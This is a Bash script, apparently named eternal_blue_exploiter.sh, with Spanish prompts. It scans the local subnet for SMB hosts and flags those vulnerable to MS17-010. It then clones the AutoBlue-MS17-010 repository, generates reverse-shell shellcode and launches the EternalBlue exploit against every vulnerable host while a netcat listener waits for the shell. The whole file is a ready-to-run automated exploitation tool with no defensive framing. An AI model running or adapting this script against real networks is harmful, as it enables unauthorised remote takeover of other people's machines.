#!/bin/bash

function eternal_blue()
{
	ip_victima=$1
	ip_atacante=$2
	puerto_atacante=$3

	rm ./AutoBlue-MS17-010/shellcode/sc* 2>/dev/null

	./gen_payload.sh "$ip_atacante" "$puerto_atacante"

	python3 ./AutoBlue-MS17-010/eternalblue_exploit7.py $ip_victima ./AutoBlue-MS17-010/shellcode/sc_x64.bin &>/dev/null
	python3 ./AutoBlue-MS17-010/eternalblue_exploit7.py $ip_victima ./AutoBlue-MS17-010/shellcode/sc_x86.bin &>/dev/null

	rm ./AutoBlue-MS17-010/shellcode/sc* 2>/dev/null

}

echo "[+] De estas interfaces, cual usaras: "

interfaces=($(ip a | grep -E "^[0-9]" | awk '{print $2}' | tr -d ':'))

familia_ips=($(ip a | grep "inet " | awk '{print $2}' | sed 's/.[0-9]*\//.0\//g'))

direcciones_ip=($(ip a | grep "inet " | awk '{print $2}' | sed 's/\/[0-9]*//g'))

for pos in $(seq 0 $((${#interfaces[@]} - 1)))
do
	echo "[$(($pos + 1))] ${interfaces[$pos]} -> ${familia_ips[$pos]} -> ${direcciones_ip[$pos]}"
done

read -p "Nro_interfaz: " nro_interfaz

nmap -p445 ${familia_ips[$((nro_interfaz - 1))]} -oG nmap_output &>/dev/null

posibles_hosts=$(cat nmap_output | grep "open" | awk '{print $2}')

rm nmap_output

hosts_vulnerables=()

for host in ${posibles_hosts[@]}
do
	salida=$(nmap -p445 --script=smb-vuln-ms17-010.nse $host | grep "VULNERABLE")
	if [ "$salida" != "" ]
	then
		echo "[*] $host es vulnerable"
		hosts_vulnerables+=($host)
	fi
done


if [ ${#hosts_vulnerables[@]} -lt 1 ]
then
	echo "[!] No hay hosts vulnerables :("
	echo "[!] Ejecutalo con sudo o como root:"
	echo -e "\tsudo ./eternal_blue_exploiter.sh"
else
	if [ ! -d "AutoBlue-MS17-010" ]
	then
		git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git 2>/dev/null
	fi
	chmod +x ./AutoBlue-MS17-010/*py
	chmod +x ./AutoBlue-MS17-010/shellcode/*py

	rm ./AutoBlue-MS17-010/shellcode/sc* &>/dev/null

	ip_atacante="${direcciones_ip[$((nro_interfaz - 1))]}" # se puede cambiar por otra

	for ip_victima in ${hosts_vulnerables[@]}
	do
		echo "[+] Explotando host: $ip_victima"
		read -p "[+] Introduce puerto (1 - 65535): " puerto_atacante

		xterm -hold -e "sudo nc -nlvp $puerto_atacante" &

		eternal_blue $ip_victima $ip_atacante $puerto_atacante

	done

fi